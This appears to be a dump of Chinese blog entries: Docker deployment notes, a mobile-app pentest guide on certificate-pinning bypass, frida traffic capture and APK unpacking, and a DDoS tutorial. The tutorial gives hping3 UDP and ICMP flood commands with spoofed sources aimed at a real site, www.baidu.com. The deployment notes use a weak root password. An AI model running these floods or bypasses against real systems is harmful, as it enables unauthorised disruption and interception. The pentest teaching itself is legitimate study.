<h3 id="一-部署mysql"><a href="#一-部署mysql" class="headerlink" title="一.部署mysql"></a>一.部署mysql</h3><h4 id="1-mysql容器启动"><a href="#1-mysql容器启动" class="headerlink" title="1.mysql容器启动"></a>1.mysql容器启动</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -p 3306:3306 --name mysql-01 \</span><br><span class="line">-v /mydata/mysql/log:/var/log/mysql \</span><br><span class="line">-v /mydata/mysql/data:/var/lib/mysql \</span><br><span class="line">-v /mydata/mysql/conf:/etc/mysql/conf.d \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=root \</span><br><span class="line">--restart=always \</span><br><span class="line">-d mysql:5.7 </span><br></pre></td></tr></table></figure>

<h4 id="2-mysql配置示例"><a href="#2-mysql配置示例" class="headerlink" title="2.mysql配置示例"></a>2.mysql配置示例</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[client]</span><br><span class="line">default-character-set=utf8mb4</span><br><span class="line"> </span><br><span class="line">[mysql]</span><br><span class="line">default-character-set=utf8mb4</span><br><span class="line"> </span><br><span class="line">[mysqld]</span><br><span class="line">init_connect=<span class="string">&#x27;SET collation_connection = utf8mb4_unicode_ci&#x27;</span></span><br><span class="line">init_connect=<span class="string">&#x27;SET NAMES utf8mb4&#x27;</span></span><br><span class="line">character-set-server=utf8mb4</span><br><span class="line">collation-server=utf8mb4_unicode_ci</span><br><span class="line">skip-character-set-client-handshake</span><br><span class="line">skip-name-resolve</span><br></pre></td></tr></table></figure>

<h4 id="3-mysql部署分析"><a href="#3-mysql部署分析" class="headerlink" title="3.mysql部署分析"></a>3.mysql部署分析</h4><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1613913/1631544800244-cd4ed8a8-06d0-40bc-9752-dd0ba9df325c.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_30,text_YXRndWlndS5jb20gIOWwmuehheiwtw==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="image.png"></p>
<p><code>1、集群内部，直接通过应用的  【服务名.项目名】 直接访问  </code></p>
<p>​        <code>mysql -uroot -hhis-mysql-glgf.his -p </code></p>
<p><code>2、集群外部</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1613913/1631621925918-a87cc4f8-be27-4d76-aafb-f47e32c692b3.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_44,text_YXRndWlndS5jb20gIOWwmuehheiwtw==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="image.png"></p>
<h3 id="二-部署redis"><a href="#二-部署redis" class="headerlink" title="二.部署redis"></a>二.部署redis</h3><h4 id="1-redis容器启动"><a href="#1-redis容器启动" class="headerlink" title="1. redis容器启动"></a>1. redis容器启动</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建配置文件</span></span><br><span class="line"><span class="comment">## 1、准备redis配置文件内容</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /mydata/redis/conf &amp;&amp; vim /mydata/redis/conf/redis.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##配置示例</span></span><br><span class="line">appendonly <span class="built_in">yes</span></span><br><span class="line">port 6379</span><br><span class="line"><span class="built_in">bind</span> 0.0.0.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#docker启动redis</span></span><br><span class="line">docker run -d -p 6379:6379 --restart=always \</span><br><span class="line">-v /mydata/redis/conf/redis.conf:/etc/redis/redis.conf \</span><br><span class="line">-v  /mydata/redis-01/data:/data \</span><br><span class="line"> --name redis-01 redis:6.2.5 \</span><br><span class="line"> redis-server /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>

<h4 id="2-redis部署分析"><a href="#2-redis部署分析" class="headerlink" title="2.redis部署分析"></a>2.redis部署分析</h4><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1613913/1631610241479-a4dc9586-872d-49ef-95a0-2d0116c9b9ed.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_29,text_YXRndWlndS5jb20gIOWwmuehheiwtw==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="image.png"></p>
<h3 id="三-部署ElasticSearch"><a href="#三-部署ElasticSearch" class="headerlink" title="三.部署ElasticSearch"></a>三.部署ElasticSearch</h3><h4 id="1-es容器启动"><a href="#1-es容器启动" class="headerlink" title="1.es容器启动"></a>1.es容器启动</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建数据目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /mydata/es-01 &amp;&amp; <span class="built_in">chmod</span> 777 -R /mydata/es-01</span><br><span class="line"></span><br><span class="line"><span class="comment"># 容器启动</span></span><br><span class="line">docker run --restart=always -d -p 9200:9200 -p 9300:9300 \</span><br><span class="line">-e <span class="string">&quot;discovery.type=single-node&quot;</span> \</span><br><span class="line">-e ES_JAVA_OPTS=<span class="string">&quot;-Xms512m -Xmx512m&quot;</span> \</span><br><span class="line">-v es-config:/usr/share/elasticsearch/config \</span><br><span class="line">-v /mydata/es-01/data:/usr/share/elasticsearch/data \</span><br><span class="line">--name es-01 \</span><br><span class="line">elasticsearch:7.13.4</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-部署分析"><a href="#2-部署分析" class="headerlink" title="2.部署分析"></a>2.部署分析</h4><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1613913/1631609524580-f264a6dc-e619-4843-a717-b8852716785d.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_34,text_YXRndWlndS5jb20gIOWwmuehheiwtw==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="image.png"></p>
<p><code>注意：子路径挂载，配置修改后，k8s不会对其pod内的相关配置文件进行热更新，需要自己重启Pod</code></p>
<p>四.应用商店</p>
<p><code>可以使用 dev-zhao 登录，从应用商店部署</code></p>
<p>五.</p>
<p><code>使用企业空间管理员（wuhan-boss）登录，设置应用仓库</code></p>
<p><code>学习Helm即可，去helm的应用市场添加一个仓库地址，比如：bitnami</code></p>
<h2 id="Ruoyi部署实战"><a href="#Ruoyi部署实战" class="headerlink" title="Ruoyi部署实战"></a>Ruoyi部署实战</h2><p><strong>nacos启动命令</strong></p>
<p><code>单节点启动</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">startup.cmd -m standalone</span><br></pre></td></tr></table></figure>

<p><strong>ruoyi项目</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Terminalk控制台</span></span><br><span class="line"><span class="built_in">cd</span> ruoyi-ui</span><br><span class="line">npm install --registry=https://registry.npmmirror.com</span><br><span class="line"><span class="built_in">set</span> NODE_OPTIONS=--openssl-legacy-provider</span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>云计算</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云原生技术</tag>
      </tags>
  </entry>
  <entry>
    <title>老男孩--手机端信息收集及渗透(3)</title>
    <url>/posts/e33055a4.html</url>
    <content><![CDATA[<h1 id="——–APP———"><a href="#——–APP———" class="headerlink" title="——–APP———-"></a>——–APP———-</h1><h2 id="APP资产收集"><a href="#APP资产收集" class="headerlink" title="APP资产收集"></a>APP资产收集</h2><p>APP中含有连接服务器的相关域名、IP等信息，通过相关工具即可实现提取</p>
<h3 id="AppInfoScanner"><a href="#AppInfoScanner" class="headerlink" title="AppInfoScanner"></a>AppInfoScanner</h3><p>项目地址：<a href="https://github.com/kelvinBen/AppInfoScanner">kelvinBen&#x2F;AppInfoScanner</a></p>
<p>一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。</p>
<p>使用配置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd AppInfoScanner</span><br><span class="line">python -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure>



<p>运行方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">扫描Android应用的APK文件、DEX文件、需要下载的APK文件下载地址、保存需要扫描的文件的目录</span></span><br><span class="line">python app.py android -i &lt;Your APK File or DEX File or APK Download Url or Save File Dir&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">扫描iOS应用的IPA文件、Mach-o文件、需要下载的IPA文件下载地址、保存需要扫描的文件目录</span></span><br><span class="line">python app.py ios -i &lt;Your IPA file or Mach-o File or IPA Download Url or Save File Dir&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">扫描Web站点的文件、目录、需要缓存的站点URl</span></span><br><span class="line">python app.py web -i &lt;Your Web file or Save Web Dir or Web Cache Url&gt;</span><br></pre></td></tr></table></figure>



<p>信息提取较少</p>
<h3 id="MobSF"><a href="#MobSF" class="headerlink" title="MobSF"></a>MobSF</h3><p>移动安全框架 （MobSF） 是一个适用于 Android、iOS 和 Windows Mobile 移动应用程序的安全研究平台。MobSF 可用于各种使用案例，例如移动应用程序安全、渗透测试、恶意软件分析和隐私分析。Static Analyzer 支持流行的移动应用程序二进制文件，如 APK、IPA、APPX 和源代码。同时，Dynamic Analyzer 支持 Android 和 iOS 应用程序，并为交互式插桩测试、运行时数据和网络流量分析提供了一个平台。MobSF 与您的 DevSecOps 或 CI&#x2F;CD 管道无缝集成，由 REST API 和 CLI 工具提供便利，轻松增强您的安全工作流程。</p>
<p>项目地址：<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF&#x2F;Mobile-Security-Framework-MobSF</a></p>
<p>快速搭建：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull opensecurity/mobile-security-framework-mobsf:latest</span><br><span class="line">docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Default username and password: mobsf/mobsf</span></span><br></pre></td></tr></table></figure>



<h2 id="抓包实现"><a href="#抓包实现" class="headerlink" title="抓包实现"></a>抓包实现</h2><h3 id="HTTP-S流量"><a href="#HTTP-S流量" class="headerlink" title="HTTP&#x2F;S流量"></a>HTTP&#x2F;S流量</h3><p>​	</p>
<p>1、Charles工具导出证书</p>
<img src="/img/oldboy/image-20250422143708653.png" alt="image-20250422143708653" style="zoom: 50\%;" />

<p>​	将证书导出，推荐为cer后缀</p>
<p>2、Fidder导出证书</p>
<img src="/img/oldboy/image-20250422144237975.png" alt="image-20250422144237975" style="zoom:50\%;" />

<p>3、Burp导出证书</p>
<img src="/img/oldboy/image-20250422144555190.png" alt="image-20250422144555190" style="zoom: 33\%;" />



<p>模拟器配置（夜神模拟器）：</p>
<img src="/img/oldboy/image-20250422143523177.png" alt="image-20250422143523177" style="zoom:50\%;" />







<p>将证书导入即可</p>
<p>配置代理：</p>
<img src="/img/oldboy/image-20250422145552048.png" alt="image-20250422145552048" style="zoom: 33\%;" />





<h3 id="其他流量"><a href="#其他流量" class="headerlink" title="其他流量"></a>其他流量</h3><p>抓不到数据包有两种情况：<br>    1.反代理机制<br>    2.证书问题</p>
<p>如果数据走的ssl https，那么数据包有三种验证情况：<br>    情况1，客户端不存在证书校验，服务器也不存在证书校验。<br>    情况2，客户端存在校验服务端证书，服务器也不存在证书校验，单项校验。<br>    情况3、客户端存在证书校验，服务器也存在证书校验，双向校验。</p>
<p>开了浏览器后，访问baidu.com的话会一直提示，前提介绍到burp fiddler 需要配置模拟器安装证书才能抓取https（工具证书）<br>访问这个app的接受服务器就相当于利用的是burp证书，和原来的app证书不一样，这样就是证书问题。校验不通过，存在异常的情况。<br>怎么区别是反代理还是证书。最简单的方法是反编译，看反代理有没有代码。还可以自己推测。</p>
<p>反代理检测：<br>1、自身的抓包应用<br>用工具（packet capture）进行抓包，如果显示正常就证明是反代理，如果异常就是证书。这种是没有设置代理，只是抓包而已。</p>
<p>2.用Proxifier<br>如果设置系统代理：<br>APP检测到设置了代理，GG<br>相当于在模拟器或手机设置代理<br>app–&gt;代理服务器–&gt;burp–&gt;服务端</p>
<p>如果用了proxifier，借助网络接口出口数据，不需要设置代理<br>相当于在网络出口设置代理<br>app–&gt;（已经逃离了模拟器或者手机）proxifier–&gt;本地burp–&gt;服务器<br>app模拟器 模拟器的网络出口数据是通过本机进行的<br>那么应该怎么操作呢？在proxifier中，找到配置文件中的代理服务器，添加一个127.0.0.1:8888的https协议的代理</p>
<h4 id="proxifier-charles"><a href="#proxifier-charles" class="headerlink" title="proxifier+charles"></a>proxifier+charles</h4><p><strong>可以绕过简单的反代理机制</strong></p>
<p>1、启动proxifier配置代理服务器和代理规则</p>
<img src="/img/oldboy/image-20250423095328356.png" alt="image-20250423095328356" style="zoom: 33\%;" />

<img src="/img/oldboy/image-20250423095407798.png" alt="image-20250423095407798" style="zoom: 50\%;" />



<p>配置代理规则：配置文件–&gt;代理规则–&gt;添加规则<br>找到夜神模拟器的对应进程：<br>C:\Program Files (x86)\Bignox\BigNoxVM\RT\NoxVMHandle.exe<br>G:\tools\nox_setup_v7.0.2.7_full\Nox\bin\Nox.exe</p>
<p>2、启动charles</p>
<p>3、点击想要抓包的应用</p>
<img src="/img/oldboy/image-20250423095526218.png" alt="image-20250423095526218" style="zoom:25\%;" />

<p><img src="/img/oldboy/image-20250423095557054.png" alt="image-20250423095557054"></p>
<h4 id="frida-r0capture"><a href="#frida-r0capture" class="headerlink" title="frida+r0capture"></a>frida+r0capture</h4><p><strong>可以绕过反代理和所有证书问题</strong></p>
<p><strong>使用frida+r0capture</strong></p>
<p>frida：<a href="https://github.com/frida/frida">frida&#x2F;frida: Clone this repo to build Frida</a></p>
<p>Fr0ysue：<a href="https://links.jianshu.com/go?to=https%5C:%5C/%5C/github.com%5C/r0ysue%5C/r0capture">https://links.jianshu.com/go?to=https\%3A\%2F\%2Fgithub.com\%2Fr0ysue\%2Fr0capture</a></p>
<p>frida版本和python版本以及Android要对应，python版本过高会导致frida不可用，以下是不严谨的版本对应关系<br>    frida12.3.6 –&gt; python3.7 –&gt; Android5-6<br>    frida12.8.0 –&gt;Python3.8–&gt;Android7-8<br>    frida14–&gt;Python3.8–&gt;Android9</p>
<p>1、下载相关依赖</p>
<p>确保自己电脑安装python环境</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install frida</span><br><span class="line">pip install frida-tools</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#注意下载版本</span></span></span><br></pre></td></tr></table></figure>

<p>安装与frida版本一致的frida工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip list</span><br><span class="line">	frida-16.7.13-cp37-abi3-win_amd64.whl</span><br><span class="line"><span class="meta prompt_">	</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装包</span></span><br><span class="line">frida-server-16.7.13-android-x86.xz</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>解压frida-server-16.7.13-android-x86.xz</p>
<p>2、将frida移动到模拟器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入夜神模拟器文件夹进入夜神模拟器文件夹</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">adb.exe push E:\hackerTools\tools\APK小程序\frida-server-16.7.13-android-x86 /data/local/frida</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">打开虚拟机终端</span></span><br><span class="line">adb shell </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">切换到这个目录</span></span><br><span class="line">cd /data/local</span><br><span class="line">chmod 777 frida </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行本文件(但是执行了还不能用需要映射一下)</span></span><br><span class="line">./frida </span><br><span class="line"></span><br><span class="line">(这个终端不可以关闭，关闭了就相当于给关闭frida了)</span><br><span class="line">（下次用就直接启动执行就行了，但是每次都要绑定端口）</span><br></pre></td></tr></table></figure>

<p>新开一个终端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042 (绑定虚拟机的端口到主机)</span><br><span class="line"></span><br><span class="line">检测是否可以执行</span><br><span class="line"></span><br><span class="line">frida-ps -U</span><br><span class="line"></span><br><span class="line">frida-ps -R</span><br><span class="line"></span><br><span class="line">（不用进模拟器终端，在外面执行）</span><br></pre></td></tr></table></figure>



<p>3、选择要抓取的软件包</p>
<p>使用APK资源提取</p>
<p><img src="/img/oldboy/image-20250422184032119.png" alt="image-20250422184032119"></p>
<p>4、进行抓包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">抓包这个软件，并且结束的时候生成一个pcap文件（可以直接用wireshark打开）</span></span><br><span class="line">r0capture.py -U -f [目标包名或者进程号] -v -p 名字.pcap</span><br></pre></td></tr></table></figure>



<p>5、使用wireshark分析流量</p>
<h4 id="Xposed-JustTrust-HOOK"><a href="#Xposed-JustTrust-HOOK" class="headerlink" title="Xposed&amp;JustTrust&amp;HOOK"></a>Xposed&amp;JustTrust&amp;HOOK</h4><p><strong>可以绕过反代理、单向证书检测</strong></p>
<p>1、在夜神模拟器中安装Xposed，打开后点一下version进行安装，需要root权限才能安装完成。</p>
<p><img src="/img/oldboy/2504969-20230913135634649-1088236033.png" alt="image.png"></p>
<p>2、重启后，安装两个apk：JustTrustMe.apk和JustMePlush.apk，然后再次重启。然后再次开启代理</p>
<p><img src="https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135634649-1088236033.png" alt="image.png"></p>
<p>在Xposed上，点击三符号，然后选择模块</p>
<p>3、然后重启，其实就是利用这两个模块，把app里面的检测功能屏蔽掉。</p>
<p>然后在打开JustMePlush，选择牛牛棋牌，然后点一下说保存成功。</p>
<p><img src="https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135635161-1688298366.png" alt="image.png"></p>
<p>4、抓取数据包</p>
<p><img src="https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135635718-1154018818.png" alt="image.png"></p>
<h1 id="——–APK———–"><a href="#——–APK———–" class="headerlink" title="——–APK———–"></a>——–APK———–</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><strong>1、反编译</strong></p>
<p>​	将APK文件反编译成静态资源以及源码</p>
<p><strong>2、反编译静态资源</strong></p>
<p>​	APK实际上就是一个压缩包，可以通过直接修改后缀为zip的方式解压得到静态资源</p>
<p><strong>3、反编译后的文件结构</strong></p>
<p>assets文件夹</p>
<p>​	assets 这里存放的是静态资源文件(图片，视频等)，这个文件夹下的资源文件不会被编译。不被编译的资源文件是指在编译过程中不会被转换成二进制代码的文件，而是直接被打包到最终的程序中。这些文件通常是一些静态资源，如图片、音频、文本文件等。</p>
<p>lib文件夹</p>
<p>​	lib：.so库(c或c++编译的动态链接库)。APK文件中的动态链接库（Dynamic Link Library，简称DLL）是一种可重用的代码库，它包含在应用程序中，以便在运行时被调用。这些库通常包含许多常见的函数和程序，可以在多个应用程序中共享，从而提高了代码的复用性和效率。</p>
<p>lib文件夹下的每个目录都适用于不同的环境下，armeabi-v7a目录基本通用所有android设备，arm64-v8a目录只适用于64位的android设备，x86目录常见用于android模拟器，x86-64目录适用于支持x86_64架构的Android设备(适用于支持通常称为“x86-64”的指令集的 CPU)</p>
<p>META-INF文件夹</p>
<p>​	META-INF：在Android应用的APK文件中，META-INF文件夹是存放数字签名相关文件的文件夹（通过对比实现校验apk文件是否被篡改）</p>
<p><strong>4、加壳</strong></p>
<p>​	为了加强Android保护强度，防止被静态反编译工具破解而泄露源码。</p>
<h2 id="加壳分析"><a href="#加壳分析" class="headerlink" title="加壳分析"></a>加壳分析</h2><p>1、在线网站检测加壳</p>
<ol>
<li><a href="https://www.zhihuaspace.cn:8888/">南明离火-移动安全分析平台</a></li>
<li><a href="https://mogua.co/">摸瓜-查诈骗APP_查病毒APP_免费APK反编译分析工具</a></li>
</ol>
<p>2、工具检测</p>
<p>apk查壳神器</p>
<p><img src="/img/oldboy/1-53.png"></p>
<p><strong>ApkCheckPack</strong></p>
<p>使用很简单，直接在命令行中通过指定目标apk即可使用</p>
<p><img src="/img/oldboy/b7e6f13796f3d0f8a4953825b8c6966d.png" alt="在这里插入图片描述"></p>
<h2 id="脱壳工具"><a href="#脱壳工具" class="headerlink" title="脱壳工具"></a>脱壳工具</h2><h3 id="未加壳"><a href="#未加壳" class="headerlink" title="未加壳"></a>未加壳</h3><p>未加壳得源码：在得到apk的静态资源时，文件夹里存在一个classes.dex文件，需要使用dex2jar工具对其进行反编译</p>
<p>1、反编译得到jar包</p>
<p>使用命令：</p>
<p>​	d2j-dex2jar.bat [classes.dex所在路径]</p>
<p>直接将classes.dex文件复制到dex2jar文件夹中，cmd打开命令行直接执行命令</p>
<p>会在同级目录下生成一个classes-dex2jar.jar文件</p>
<p>2、分析jar包</p>
<p>打开jd-gui程序，将生成的jar文件导入即可</p>
<h3 id="静态脱壳"><a href="#静态脱壳" class="headerlink" title="静态脱壳"></a>静态脱壳</h3><p>需要搭配BlackDex64.apk使用</p>
<p>通过夜神模拟器将BlackDex64.apk安装</p>
<p>打开BlackDex64，选择脱壳的文件</p>
<p><img src="/img/oldboy/1-54.png"></p>
<p>查看DEX文件存储的文件</p>
<p><img src="/img/oldboy/1-55.png"></p>
<p>获得dex文件源码</p>
<p>​	通过未加壳的方式，对dex进行反编译，实现源码文件资源</p>
<h2 id="动态脱壳"><a href="#动态脱壳" class="headerlink" title="动态脱壳"></a>动态脱壳</h2><p>1、首先模拟器安装要测试的apk</p>
<p>2、物理机安装frida-dexdump</p>
<p><img src="/img/oldboy/wps1-1740833264863-37.jpg" alt="img"> </p>
<p>3、将 <a href="C:\Users\ZhuanZ\Downloads\frida-server-16.6.6-android-x86.xz">frida-server-16.6.6-android-x86.xz</a> 复制到夜神模拟器bin目录下</p>
<p>手机模拟器实际上就是基于Linux为底层的操作系统</p>
<p>D:\杂项\Nox\bin\adb.exe 提供了接口可以实现连接到Linux底层</p>
<p>adb connect 127.0.0.1:62001</p>
<p>(每种模拟器的默认端口都不同)，使用adb shell命令进行测试</p>
<p>4、将frida-serverx86上传的模拟器</p>
<p>app push [frida名称] &#x2F;data&#x2F;local&#x2F;tmp</p>
<p>5、使用adb shell，给frida文件赋予执行权限</p>
<p>adb shell</p>
<p>chmod 777  &#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server-16.6.6-android-x86</p>
<p>.&#x2F;frida-server-16.6.6-android-x86</p>
<p>6、获得包名</p>
<p>​	通过BlackDex64软件查看安装文件的包名</p>
<p>​	<img src="/img/oldboy/1-56.png"></p>
<p>​	</p>
<p>7、查看当前包名的pid</p>
<p><img src="/img/oldboy/wps3-1740833264863-44.jpg" alt="img"> </p>
<p>8、在主机上安装frida(在python中script可以看到frida工具已经安装)</p>
<p>pip3 install frida</p>
<p>pip3 install frida-tools</p>
<p>9、进入frida-dexdump文件夹</p>
<p><img src="/img/oldboy/wps4-1740833264863-40.jpg" alt="img"> </p>
<p>打开cmd执行</p>
<p>.\frida-dexdump.exe -U -p pid</p>
<p><img src="/img/oldboy/wps5-1740833264863-42.jpg" alt="img"> </p>
<p>成功脱壳</p>
<p><img src="/img/oldboy/wps6-1740833264863-38.jpg" alt="img"> </p>
<p>使用dex2jar获取jar包</p>
<p><img src="/img/oldboy/wps7-1740833264863-41.jpg" alt="img"> </p>
<p>使用jd-jui打开</p>
<p><img src="/img/oldboy/wps8-1740833264863-43.jpg" alt="img">  </p>
<h2 id="小程序逆向反编译"><a href="#小程序逆向反编译" class="headerlink" title="小程序逆向反编译"></a>小程序逆向反编译</h2><p>首先要找到小程序的存放位置D:\Tencent\WeGame\WeChat Files\Applet</p>
<p>如果PC微信小程序软件包加密，文件以V1MMWXQ开头，需要先进行解密才可以反编译</p>
<p>使用工具UnpackMiniApp.exe,将文件目录的_APP_wxapkg拖动</p>
<p><img src="/img/oldboy/image-20250303093556492.png" alt="image-20250303093556492"></p>
<p>会在wxpack文件夹下生成解密后的软件包</p>
<p>使用CrackMinApp进行反编译</p>
<p><img src="/img/oldboy/image-20250303093949117.png" alt="image-20250303093949117"></p>
<p>如果工具不能使用，需要手动去反编译</p>
<p>首先打开工具箱里的nodejs文件夹，将解密后的小程序复制到此文件夹内，打开cmd命令，执行node.exe wuWxapkg.js [xxx.wxapkg]</p>
<p>会在改文件夹下生成[xxx]的文件夹</p>
<p>使用微信小程序开发者工具进行打开</p>
<img src="/img/oldboy/image-20250303094828034.png" alt="image-20250303094828034" style="zoom:50\%;" />

<p>获得到源码资源</p>
<img src="/img/oldboy/image-20250303095114113.png" alt="image-20250303095114113" style="zoom:50\%;" />

]]></content>
      <categories>
        <category>网络安全</category>
        <category>老男孩安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>老男孩安全</tag>
      </tags>
  </entry>
  <entry>
    <title>老男孩--DDOS攻击与防御(4)</title>
    <url>/posts/f7a7b84b.html</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p><strong>本教程仅在合法授权的情况下进行测试和研究，请勿用于其他用途。未经授权使用此类工具可能会侵犯他人隐私，触犯相关法律，任何因此引发的法律或利益纠纷与本人无关。</strong></p>
<h3 id="DDOS介绍"><a href="#DDOS介绍" class="headerlink" title="DDOS介绍"></a>DDOS介绍</h3><p>DOS攻击：指的是采取一对一的方式，攻击目标服务器，使攻击目标CPU使用率提高，网络可以带宽减少等方式耗尽服务器的资源</p>
<p><strong>DDOS攻击：攻击指借助于客户&#x2F;服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DoS攻击，从而成倍地提高拒绝服务攻击的威力。</strong></p>
<p>被攻击时的现象：</p>
<ol>
<li>被攻击的主机上<strong>有大量等待的TCP连接</strong>。</li>
<li>网络中充<strong>斥着大量的无用的数据包，源地址为假</strong>。</li>
<li>制造<strong>高流量无用数据，造成网络拥塞</strong>，使被攻击的主机无法正常通信。</li>
<li>利用受害主机提供的服务或传输协议上的缺陷，反复高速的发出特定的服务请求，<strong>使受害主机无法及时处理所有正常请求。</strong></li>
<li>严重时会造成<strong>系统死机</strong>。</li>
</ol>
<h1 id="DDOS类型"><a href="#DDOS类型" class="headerlink" title="DDOS类型"></a>DDOS类型</h1><h2 id="流量型攻击"><a href="#流量型攻击" class="headerlink" title="流量型攻击"></a>流量型攻击</h2><h3 id="ICMP-Flood攻击"><a href="#ICMP-Flood攻击" class="headerlink" title="ICMP Flood攻击"></a>ICMP Flood攻击</h3><h4 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p>攻击原理：就是向目标发送大量的 ICMP <code>Echo-Reply（type 0，code 0）</code>或 <code>Echo-Request（type 8，code0）</code>报文。目的一般为耗尽目标服务器的带宽，并且机器去处理这些请求也会占用一点IO\CPU资源，但资源消耗过大就会导致DoS。</p>
<h4 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h4><p>hping3</p>
<p><a href="https://www.cnblogs.com/liuxinyustu/articles/12808972.html">hping3 使用详解 - liuxinyu123 - 博客园</a></p>
<p>1、UDP ddos攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hping3 -c 10000 -d 120 --udp -w 64 -p 80 --flood --rand-source www.baidu.com</span><br></pre></td></tr></table></figure>

<p>2、ICMP ddos攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hping3 -c 10000 -d 120 --icmp -w 64 -p 80 --flood --rand-source www.baidu.com</span><br></pre></td></tr></table></figure>



<h3 id="Smurf攻击"><a href="#Smurf攻击" class="headerlink" title="Smurf攻击"></a>Smurf攻击</h3><h4 id="攻击介绍-1"><a href="#攻击介绍-1" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、介绍</strong></p>
<p>​	Smurf攻击是一种分布式拒绝服务攻击（DDOS）攻击，利用IP协议中的ICMP请求和网络广播的特性，发送大量的<strong>ICMP Echo</strong>请求包，使目标主机造成网络带宽堵塞、资源消耗、拒绝服务等。</p>
<p><strong>2、攻击原理</strong></p>
<ol>
<li>攻击者伪造受害者的IP地址向本网络广播地址发送<strong>ICMP Echo</strong>请求包</li>
<li>网络广播地址代表本网段的所有设备（实际上相当于发送给了所有主机<strong>ICMP Echo</strong>请求包）</li>
<li>本网段内的主机进行<strong>ICMP Echo</strong>回应包发送给请求的主机</li>
<li>受害者接收到海量回应包</li>
</ol>
<p><strong>3、应对方法</strong></p>
<ol>
<li>过滤广播地址：在网络的出口路由器上配置过滤规则，禁止广播地址的流量通过，阻止攻击者的Echo Request报文进入目标网络。</li>
<li>启用反向路径过滤（Reverse Path Filtering）：通过验证数据包的源IP地址是否为网络出口合法的路径返回地址，来过滤掉源IP地址伪造的报文。</li>
<li>使用流量限制措施：通过使用防火墙和入侵检测系统（IDS）等技术，对网络流量进行监控和管理，及时发现并限制异常流量。</li>
<li>升级网络设备：确保网络设备的固件和软件及时更新至最新版本，以修复已知漏洞，提升网络安全性。</li>
</ol>
